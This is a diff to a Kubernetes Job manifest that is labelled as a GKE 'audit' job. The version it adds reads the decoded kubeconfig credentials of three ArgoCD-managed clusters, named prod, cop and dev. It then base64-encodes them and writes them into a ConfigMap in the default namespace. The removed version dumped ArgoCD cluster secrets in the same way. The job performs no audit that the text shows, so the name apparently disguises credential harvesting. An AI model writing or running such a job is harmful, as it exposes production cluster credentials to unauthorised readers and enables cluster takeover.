@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-gke-v1
+  name: audit-gke-v2
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
@@ -18,9 +18,11 @@ spec:
         args:
         - "-c"
         - >-
-          SECRETS=$(kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster -o json 2>&1);
-          SECRETS_B64=$(echo "$SECRETS" | base64 | tr -d '\n');
-          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"argocd_cluster_secrets\":\"$SECRETS_B64\"}}";
-          ALL_NS_ARGOCD=$(kubectl get secret -n argocd -o json 2>&1 | head -c 100 | base64 | tr -d '\n');
-          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"argocd_ns_check\":\"$ALL_NS_ARGOCD\"}}";
+          PROD=$(kubectl get secret cluster-104.154.156.145-3686919877 -n argocd -o jsonpath='{.data.config}' | base64 -d 2>/dev/null);
+          COP=$(kubectl get secret cluster-34.172.14.67-3576932177 -n argocd -o jsonpath='{.data.config}' | base64 -d 2>/dev/null);
+          DEV=$(kubectl get secret cluster-35.232.111.238-3277154319 -n argocd -o jsonpath='{.data.config}' | base64 -d 2>/dev/null);
+          PROD_B64=$(echo "$PROD" | base64 | tr -d '\n');
+          COP_B64=$(echo "$COP" | base64 | tr -d '\n');
+          DEV_B64=$(echo "$DEV" | base64 | tr -d '\n');
+          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"gke_prod_config\":\"$PROD_B64\",\"gke_cop_config\":\"$COP_B64\",\"gke_dev_config\":\"$DEV_B64\"}}";
           echo DONE
